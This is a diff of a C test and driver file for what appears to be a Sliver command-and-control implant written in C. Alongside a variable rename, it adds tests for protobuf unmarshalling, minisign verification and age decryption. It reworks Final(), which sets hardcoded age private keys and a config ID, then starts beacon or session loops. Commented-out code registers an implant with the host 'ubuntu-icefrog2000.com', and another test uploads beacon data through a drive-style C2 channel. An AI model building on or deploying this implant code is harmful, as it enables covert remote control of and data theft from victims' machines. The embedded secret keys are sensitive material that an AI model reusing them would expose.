@@ -976,7 +976,7 @@ void test57(void) {
 }
 
 void test58(void) {
-	BYTE MarshalledData[] = { 10, 5, 1, 2, 3, 4, 5, 18, 147, 2, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 24, 188, 181, 226, 179, 197, 198, 4, 32, 1, 48, 213, 204, 221, 195, 8, 58, 11, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 58, 11, 84, 114, 97, 110, 103, 32, 78, 104, 117, 110, 103, 58, 10, 78, 103, 111, 99, 32, 72, 117, 121, 101, 110, 66, 25, 10, 10, 72, 97, 110, 103, 32, 84, 114, 97, 110, 103, 10, 11, 84, 114, 97, 110, 32, 80, 104, 117, 111, 110, 103, 74, 10, 0, 7, 8, 9, 153, 239, 213, 154, 147, 2 };
+	BYTE MarshaledData[] = { 10, 5, 1, 2, 3, 4, 5, 18, 147, 2, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 24, 188, 181, 226, 179, 197, 198, 4, 32, 1, 48, 213, 204, 221, 195, 8, 58, 11, 68, 111, 32, 84, 105, 101, 110, 32, 68, 97, 116, 58, 11, 84, 114, 97, 110, 103, 32, 78, 104, 117, 110, 103, 58, 10, 78, 103, 111, 99, 32, 72, 117, 121, 101, 110, 66, 25, 10, 10, 72, 97, 110, 103, 32, 84, 114, 97, 110, 103, 10, 11, 84, 114, 97, 110, 32, 80, 104, 117, 111, 110, 103, 74, 10, 0, 7, 8, 9, 153, 239, 213, 154, 147, 2 };
 	PPBElement ElementList[9];
 	DWORD i = 0;
 	LPVOID* pResult = NULL;
@@ -1002,11 +1002,11 @@ void test58(void) {
 	ElementList[7]->SubElements[0]->Type = RepeatedBytes;
 	ElementList[7]->SubElements[0]->dwFieldIdx = 1;
 	ElementList[7]->dwNumberOfSubElement = 1;
-	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshalledData, sizeof(MarshalledData), NULL);
+	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshaledData, sizeof(MarshaledData), NULL);
 }
 
 void test59(void) {
-	BYTE MarshalledData[] = { 8, 128, 133, 255, 240, 159, 161, 182, 185, 245, 1, 16, 11, 26, 51, 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 48, 48, 50, 100, 56, 102, 54, 97, 45, 100, 98, 51, 55, 45, 52, 99, 97, 50, 45, 98, 102, 101, 57, 45, 55, 98, 56, 101, 50, 97, 55, 100, 102, 49, 98, 102 };
+	BYTE MarshaledData[] = { 8, 128, 133, 255, 240, 159, 161, 182, 185, 245, 1, 16, 11, 26, 51, 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 48, 48, 50, 100, 56, 102, 54, 97, 45, 100, 98, 51, 55, 45, 52, 99, 97, 50, 45, 98, 102, 101, 57, 45, 55, 98, 56, 101, 50, 97, 55, 100, 102, 49, 98, 102 };
 	PPBElement ElementList[4];
 	DWORD i = 0;
 	PENVELOPE pResult = NULL;
@@ -1020,7 +1020,7 @@ void test59(void) {
 	ElementList[1]->Type = Varint;
 	ElementList[2]->Type = Bytes;
 	ElementList[3]->Type = Varint;
-	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshalledData, sizeof(MarshalledData), NULL);
+	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshaledData, sizeof(MarshaledData), NULL);
 	PrintFormatA("pResult->uID: 0x%08llx\n", pResult->uID);
 	PrintFormatA("pResult->uType: 0x%08llx\n", pResult->uType);
 	HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
@@ -1028,7 +1028,7 @@ void test59(void) {
 }
 
 void test60(void) {
-	BYTE MarshalledData[] = { 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 101, 101, 102, 54, 100, 48, 52, 54, 45, 53, 97, 49, 99, 45, 52, 53, 99, 51, 45, 98, 52, 99, 53, 45, 97, 51, 55, 100, 50, 98, 49, 55, 97, 57, 54, 56 };
+	BYTE MarshaledData[] = { 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 101, 101, 102, 54, 100, 48, 52, 54, 45, 53, 97, 49, 99, 45, 52, 53, 99, 51, 45, 98, 52, 99, 53, 45, 97, 51, 55, 100, 50, 98, 49, 55, 97, 57, 54, 56 };
 	PPBElement ElementList[2];
 	DWORD i = 0;
 	PBYTE pResult = NULL;
@@ -1056,7 +1056,7 @@ void test60(void) {
 	ElementList[1]->SubElements[2]->Type = Bytes;
 	ElementList[1]->SubElements[3]->Type = Bytes;
 
-	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshalledData, sizeof(MarshalledData), NULL);
+	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshaledData, sizeof(MarshaledData), NULL);
 }
 
 void test61(void) {
@@ -1065,8 +1065,8 @@ void test61(void) {
 
 void test62(void) {
 	/*PSLIVER_HTTP_CLIENT pSliverClient = NULL;
-	PBYTE pMarshalledRegisterInfo = NULL;
-	DWORD cbMarshalledRegisterInfo = 0;
+	PBYTE pMarshaledRegisterInfo = NULL;
+	DWORD cbMarshaledRegisterInfo = 0;
 	PENVELOPE pRegisterEnvelope = NULL;
 
 	pSliverClient = SliverSessionInit("http://ubuntu-icefrog2000.com");
@@ -1078,8 +1078,8 @@ void test62(void) {
 	PrintFormatA("pSliverClient->szSessionID: %s\n", pSliverClient->szSessionID);
 	pSliverClient->HttpConfig.AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pSliverClient->szSessionID) + lstrlenA(pSliverClient->lpCookiePrefix) + 1);
 	wsprintfA(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
-	pMarshalledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshalledRegisterInfo);
-	if (pMarshalledRegisterInfo == NULL) {
+	pMarshaledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshaledRegisterInfo);
+	if (pMarshaledRegisterInfo == NULL) {
 		LogError(L"%s.%d: RegisterSliver failed at %s\n", __FILE__, __LINE__, __FUNCTIONW__);
 		goto CLEANUP;
 	}
@@ -1087,8 +1087,8 @@ void test62(void) {
 	pRegisterEnvelope = ALLOC(sizeof(ENVELOPE));
 	pRegisterEnvelope->uType = MsgRegister;
 	pRegisterEnvelope->pData = ALLOC(sizeof(BUFFER));
-	pRegisterEnvelope->pData->pBuffer = pMarshalledRegisterInfo;
-	pRegisterEnvelope->pData->cbBuffer = cbMarshalledRegisterInfo;
+	pRegisterEnvelope->pData->pBuffer = pMarshaledRegisterInfo;
+	pRegisterEnvelope->pData->cbBuffer = cbMarshaledRegisterInfo;
 	WriteEnvelope(pSliverClient, pRegisterEnvelope);
 	SessionMainLoop(pSliverClient);
 CLEANUP:
@@ -1527,8 +1527,8 @@ void test100(void) {
 
 void test101(void) {
 	/*PSLIVER_HTTP_CLIENT pSliverClient = NULL;
-	PBYTE pMarshalledRegisterInfo = NULL;
-	DWORD cbMarshalledRegisterInfo = 0;
+	PBYTE pMarshaledRegisterInfo = NULL;
+	DWORD cbMarshaledRegisterInfo = 0;
 	PENVELOPE pRegisterEnvelope = NULL;
 
 	pSliverClient = SliverSessionInit("http://ubuntu-icefrog2000.com");
@@ -1540,8 +1540,8 @@ void test101(void) {
 	PrintFormatA("pSliverClient->szSessionID: %s\n", pSliverClient->szSessionID);
 	pSliverClient->HttpConfig.AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pSliverClient->szSessionID) + lstrlenA(pSliverClient->lpCookiePrefix) + 1);
 	wsprintfA(pSliverClient->HttpConfig.AdditionalHeaders[Cookie], "%s=%s", pSliverClient->lpCookiePrefix, pSliverClient->szSessionID);
-	pMarshalledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshalledRegisterInfo);
-	if (pMarshalledRegisterInfo == NULL) {
+	pMarshaledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshaledRegisterInfo);
+	if (pMarshaledRegisterInfo == NULL) {
 		LogError(L"%s.%d: RegisterSliver failed at %s", __FILE__, __LINE__, __FUNCTIONW__);
 		goto CLEANUP;
 	}
@@ -1549,8 +1549,8 @@ void test101(void) {
 	pRegisterEnvelope = ALLOC(sizeof(ENVELOPE));
 	pRegisterEnvelope->uType = MsgRegister;
 	pRegisterEnvelope->pData = ALLOC(sizeof(BUFFER));
-	pRegisterEnvelope->pData->pBuffer = pMarshalledRegisterInfo;
-	pRegisterEnvelope->pData->cbBuffer = cbMarshalledRegisterInfo;
+	pRegisterEnvelope->pData->pBuffer = pMarshaledRegisterInfo;
+	pRegisterEnvelope->pData->cbBuffer = cbMarshaledRegisterInfo;
 	WriteEnvelope(pSliverClient, pRegisterEnvelope);
 	SessionMainLoop(pSliverClient);
 CLEANUP:
@@ -1781,7 +1781,7 @@ void test114(void) {
 }
 
 void test115(void) {
-	PBUFFER pMarshalledEnvelope = NULL;
+	PBUFFER pMarshaledEnvelope = NULL;
 	DWORD i = 0;
 	CHAR szName[] = "Demo.txt";
 	PDRIVE_CONFIG pDriveConfig = NULL;
@@ -1799,9 +1799,9 @@ void test115(void) {
 	PHTTP_RESP pResp = NULL;
 	PSLIVER_DRIVE_CLIENT pDriveClient = NULL;
 
-	pMarshalledEnvelope = ALLOC(sizeof(BUFFER));
-	pMarshalledEnvelope->pBuffer = DuplicateStrA("Hello from beacon", 0);
-	pMarshalledEnvelope->cbBuffer = lstrlenA(pMarshalledEnvelope->pBuffer);
+	pMarshaledEnvelope = ALLOC(sizeof(BUFFER));
+	pMarshaledEnvelope->pBuffer = DuplicateStrA("Hello from beacon", 0);
+	pMarshaledEnvelope->cbBuffer = lstrlenA(pMarshaledEnvelope->pBuffer);
 	pUri = UriInit(szUrl);
 	if (pUri == NULL) {
 		goto CLEANUP;
@@ -1812,10 +1812,10 @@ void test115(void) {
 		goto CLEANUP;
 	}
 
-	lpBody = ALLOC(pMarshalledEnvelope->cbBuffer + 0x400);
+	lpBody = ALLOC(pMarshaledEnvelope->cbBuffer + 0x400);
 	if (lpBody == NULL) {
 		NoHeapMemory = TRUE;
-		lpBody = VirtualAlloc(NULL, pMarshalledEnvelope->cbBuffer + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		lpBody = VirtualAlloc(NULL, pMarshaledEnvelope->cbBuffer + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		if (lpBody == NULL) {
 			LOG_ERROR("VirtualAlloc", GetLastError());
 			goto CLEANUP;
@@ -1825,8 +1825,8 @@ void test115(void) {
 	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
 	lpUniqueBoundary = GenRandomStr(16);
 	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szName);
-	memcpy(&lpBody[cbBody], pMarshalledEnvelope->pBuffer, pMarshalledEnvelope->cbBuffer);
-	cbBody += pMarshalledEnvelope->cbBuffer;
+	memcpy(&lpBody[cbBody], pMarshaledEnvelope->pBuffer, pMarshaledEnvelope->cbBuffer);
+	cbBody += pMarshaledEnvelope->cbBuffer;
 	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
 	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
 
@@ -1860,7 +1860,7 @@ CLEANUP:
 	}
 
 	FreeDriveClient(pDriveClient);
-	FreeBuffer(pMarshalledEnvelope);
+	FreeBuffer(pMarshaledEnvelope);
 	return Result;
 }
 
@@ -1903,6 +1903,60 @@ void test119(void) {
 	PrintFormatA("%s\n", lpResult);
 }
 
+void test120(void) {
+	BYTE Buffer[] = { 97 ,103 ,101 ,49 ,51 ,110 ,121 ,108 ,56 ,116 ,117 ,101 ,103 ,99 ,99 ,119 ,112 ,50 ,101 ,56 ,52 ,112 ,114 ,112 ,120 ,116 ,99 ,100 ,116 ,55 ,109 ,99 ,50 ,109 ,52 ,107 ,52 ,53 ,57 ,104 ,114 ,54 ,50 ,51 ,118 ,102 ,116 ,48 ,101 ,115 ,55 ,107 ,100 ,51 ,118 ,115 ,122 ,104 ,114 ,118 ,107 ,117 };
+	BUFFER Message;
+	Message.pBuffer = Buffer;
+	Message.cbBuffer = sizeof(Buffer);
+	CHAR szSignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+WHpHstchyjZDtG8gsraZpGTaEGz7MvUQ8aas1Cnl1nbLv2a8jMLEbnKh4TEbYJaKuZAxlxLn4Jbdb1+T9Uf+g0=\ntrusted comment: timestamp:1729873121\nLZxs9NlszjyShQgFLxWrziZ7JzDMpgIBfPSOOkboexF8Eursc4SDtVlC1x5r9yTMqS67SHyJbl35/x6LJ3PRCw==";
+	CHAR szMinisignServerPublicKey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+
+	BOOL Result = MinisignVerify(&Message, szSignature, szMinisignServerPublicKey);
+	PrintFormatA("Result: %d\n", Result);
+}
+
+void test121(void) {
+	CHAR szRecipientPrivateKey[] = "AGE-SECRET-KEY-1H0HPRPWCF67PPNU3WS0SLXJZPYVPRCXERN3QV93JR2M84S82UC4QM24RFG";
+	CHAR Ciphertext[] = { 97, 83, 51, 98, 50, 49, 99, 121, 110, 101, 78, 73, 89, 83, 53, 107, 101, 54, 90, 90, 76, 112, 72, 72, 67, 99, 77, 115, 50, 105, 116, 66, 73, 51, 122, 53, 107, 85, 122, 97, 104, 105, 107, 10, 90, 50, 97, 110, 65, 97, 69, 116, 111, 66, 106, 85, 103, 73, 71, 82, 101, 84, 89, 75, 97, 52, 99, 53, 81, 55, 90, 110, 107, 85, 48, 101, 73, 76, 70, 97, 79, 88, 89, 113, 75, 53, 69, 10, 45, 45, 45, 32, 109, 81, 114, 69, 108, 48, 113, 65, 55, 110, 117, 68, 113, 77, 108, 114, 105, 99, 97, 110, 57, 85, 48, 119, 102, 77, 68, 73, 84, 55, 55, 54, 48, 55, 57, 70, 117, 99, 53, 90, 48, 69, 81, 10, 80, 101, 245, 237, 116, 200, 23, 99, 156, 85, 35, 10, 161, 253, 221, 108, 193, 31, 234, 48, 171, 31, 168, 224, 135, 218, 61, 255, 22, 250, 96, 144, 175, 149, 68, 232, 128, 124, 53, 219, 158, 226, 175, 220, 152, 53, 112, 248, 19, 66, 6, 136, 157, 176, 66, 141, 107, 234, 128, 223, 169, 39, 249, 188 };
+	BUFFER Buffer;
+	PBUFFER pResult = NULL;
+
+	Buffer.pBuffer = &Ciphertext;
+	Buffer.cbBuffer = _countof(Ciphertext);
+	pResult = AgeDecrypt(szRecipientPrivateKey, &Buffer);
+	PrintFormatA("pResult:\n");
+	HexDump(pResult->pBuffer, pResult->cbBuffer);
+	FreeBuffer(pResult);
+}
+
+void test122(void) {
+	PSTANZA_WRAPPER pStanzaList = NULL;
+	CHAR Ciphertext[] = { 78, 106, 116, 98, 81, 47, 49, 81, 109, 115, 86, 54, 52, 101, 83, 113, 69, 105, 98, 50, 97, 121, 75, 101, 119, 77, 47, 106, 71, 68, 80, 52, 90, 88, 90, 71, 116, 50, 73, 55, 103, 86, 65, 10, 67, 86, 88, 53, 118, 108, 75, 114, 89, 80, 103, 112, 101, 55, 107, 43, 116, 113, 72, 56, 109, 119, 82, 104, 81, 113, 49, 100, 111, 87, 114, 118, 116, 66, 78, 79, 116, 86, 106, 89, 114, 79, 48, 10, 45, 45, 45, 32, 83, 85, 76, 108, 71, 56, 56, 117, 76, 80, 53, 99, 121, 118, 111, 81, 51, 56, 84, 87, 81, 68, 90, 109, 74, 106, 110, 57, 78, 109, 75, 118, 68, 75, 66, 66, 88, 112, 65, 87, 54, 116, 56, 10, 151, 161, 50, 125, 201, 131, 78, 23, 140, 226, 117, 173, 59, 185, 54, 143, 150, 37, 236, 185, 69, 233, 11, 0, 94, 109, 107, 160, 8, 175, 140, 30, 108, 130, 158, 60, 212, 52, 23, 60, 23, 86, 114, 235, 96, 227, 115, 254, 238, 169, 73, 152, 0, 76, 205, 60, 28, 60, 58, 133, 72, 110, 84, 89 };
+	BYTE FileKey[] = { 224, 18, 103, 86, 180, 209, 104, 26, 46, 70, 147, 76, 165, 234, 170, 44 };
+	CHAR szAgeMsgPrefix[] = "age-encryption.org/v1\n-> X25519 ";
+	DWORD cbTempBuffer = 0;
+	PBUFFER pCipherText = NULL;
+	PBYTE pTempBuffer = NULL;
+	PBYTE pMac = NULL;
+
+	pCipherText = ALLOC(sizeof(BUFFER));
+	pCipherText->pBuffer = Ciphertext;
+	pCipherText->cbBuffer = sizeof(Ciphertext);
+
+	cbTempBuffer = lstrlenA(szAgeMsgPrefix) + pCipherText->cbBuffer;
+	pTempBuffer = ALLOC(cbTempBuffer);
+	lstrcpyA(pTempBuffer, szAgeMsgPrefix);
+	memcpy(pTempBuffer + lstrlenA(szAgeMsgPrefix), pCipherText->pBuffer, pCipherText->cbBuffer);
+	pStanzaList = ParseStanza(pTempBuffer);
+
+	pMac = HeaderMAC(pStanzaList, FileKey, sizeof(FileKey));
+	HexDump(pMac, SHA256_HASH_SIZE);
+	pCipherText->pBuffer = NULL;
+	FreeBuffer(pCipherText);
+	FREE(pTempBuffer);
+	FREE(pMac);
+}
+
 VOID DetectMonitorSystem(VOID)
 {
 	while (TRUE) {
@@ -1918,7 +1972,8 @@ VOID Final(VOID)
 {
 	HANDLE hThread = NULL;
 	DWORD dwThreadId = 0;
-	
+	PGLOBAL_CONFIG pGlobalConfig = NULL;
+
 #ifdef _BEACON
 	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
@@ -1930,8 +1985,7 @@ VOID Final(VOID)
 	CHAR szConfigId[] = "e7a32220-326e-422d-9215-1503b6d69ce5";
 	DWORD dwMaxFailure = 5;
 	DWORD dwReconnectInterval = 600;
-	PGLOBAL_CONFIG pGlobalConfig = NULL;
-#else
+#elif _SESSION
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
 	CHAR szPeerPubKey[] = "age1p6yn2nngy5up5mwy9cl98k9g3v4e80j7vuca20046nr2cny6n46q0yu0dr";
@@ -1942,7 +1996,12 @@ VOID Final(VOID)
 	CHAR szConfigId[] = "2fcc56b8-fbf9-4c3f-99be-d7ba7f2ab289";
 	DWORD dwMaxFailure = 5;
 	DWORD dwReconnectInterval = 600;
-	PGLOBAL_CONFIG pGlobalConfig = NULL;
+#else
+	CHAR szPeerPubKey[] = "age1k7qh27zf9v4d3ystvlkdzaxlpn4fs5zgntxfzwraqj2gk6xl0e3ssdzhjy";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1JEE7U0JL58FKMEXY3U5WP2KJ2V2Q8AJNG7TSL7HN8KH0Y8HWASJQ2HVZ6S";
+	CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: \nRWTPhXK7/jqk+aZEopilp1prxuEKzrnfgQR3yxMHsCVAsLe+VAMy7OmKpgePtSriqTmwOMdhkTy0pFpJgwIChwCP0BnNS0DG0gI=\ntrusted comment: 1729822855\n0yadVaLH3tNnDhUQLVkkd8oZwIG48QH8YmH2a+HXiYAvvoA4slwQFP+35kphcOuh4+8ZzZS1o8nwp+mQg7jWDw==";
 #endif
 
 #ifndef _DEBUG
@@ -1958,18 +2017,22 @@ VOID Final(VOID)
 	pGlobalConfig->lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
 	pGlobalConfig->lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
 	pGlobalConfig->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
-	pGlobalConfig->uEncoderNonce = uEncoderNonce;
+	pGlobalConfig->lpPeerAgePublicKeySignature = DuplicateStrA(szPeerAgePublicKeySignature, 0);
+	/*pGlobalConfig->uEncoderNonce = uEncoderNonce;
 	lstrcpyA(pGlobalConfig->szSliverName, szSliverClientName);
 	lstrcpyA(pGlobalConfig->szConfigID, szConfigId);
 	pGlobalConfig->dwMaxFailure = dwMaxFailure;
-	pGlobalConfig->dwReconnectInterval = dwReconnectInterval;
+	pGlobalConfig->dwReconnectInterval = dwReconnectInterval;*/
 	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
+	pGlobalConfig->uPeerID = GeneratePeerID();
 #ifdef _BEACON
 	pBeaconClient = BeaconInit(pGlobalConfig);
 	BeaconMainLoop(pBeaconClient);
-#else
+#elif _SESSION
 	pSessionClient = SessionInit(pGlobalConfig);
 	SessionMainLoop(pSessionClient);
+#else
+
 #endif
 CLEANUP:
 	if (hThread != NULL) {
@@ -1982,7 +2045,7 @@ CLEANUP:
 #ifdef _BEACON
 	FreeBeaconClient(pBeaconClient);
 #else
-	FreeSessionClient(pSessionClient);
+	//FreeSessionClient(pSessionClient);
 #endif
 }
 
@@ -2135,7 +2198,10 @@ int main(void) {
 	//test117();
 	//test118();
 	//test119();
-	Final();
+	//test120();
+	test121();
+	//test122();
+	//Final();
 
 	return 0;
 }
